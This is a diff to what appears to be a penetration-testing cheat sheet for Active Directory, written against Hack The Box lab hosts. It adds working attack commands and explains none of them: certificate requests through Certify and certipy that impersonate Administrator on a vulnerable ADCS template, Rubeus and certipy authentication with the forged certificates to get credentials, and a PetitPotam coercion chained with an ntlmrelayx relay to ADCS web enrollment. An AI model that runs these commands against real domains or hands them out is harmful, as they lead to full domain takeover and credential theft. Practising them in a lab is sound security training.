@@ -817,13 +817,20 @@ python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY
 ```
 ### ADCS
 ```powershell
+# Cert request
 .\Certify.exe find /vulnerable
 .\Certify.exe request /ca:<CA Name> /template:<Template Name> /altname:Administrator
 
 openssl pkcs12 -in cert.pem -inkey priv.key -keyex -CSP "Microsoft Enhanced
 Cryptographic Provider v1.0" -export -out admin.pfx
 
+certipy req -username 'user@example.com' -password Password -ca CA_Name -dc-ip DCIP -template TempName -upn
+'Administrator@example.com' -debug
+
+# TGT request
 .\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /getcredentials /password:
+
+certipy auth -pfx administrator.pfx -dc-ip <dc-ip> -debug
 ```
 #### PassTheCert
 ```powershell
@@ -838,6 +845,14 @@ Get-DomainComputer <Computer Name>
 
 impacket-getST -spn 'cifs/authority.authority.htb' -impersonate Administrator 'authority.htb/DESKTOP-1337$:99U1VOMhRX6LEvISJJQ9PMo07osUJLcp'
 impacket-wmiexec -k -no-pass authority.htb/Administrator@authority.authority.htb
+```
+#### PetitPotam
+```bash
+sudo ntlmrelayx.py -debug -smb2support --target http://target.htb.local/certsrv/certfnsh.asp --adcs --template DomainController
+python3 PetitPotam.py kaliIP targetIP
+
+# TGT request
+.\Rubeus.exe asktgt /user:Administrator /certificate:[Base64_Cert] /getcredentials /password:
 ```
 
 ## Linux
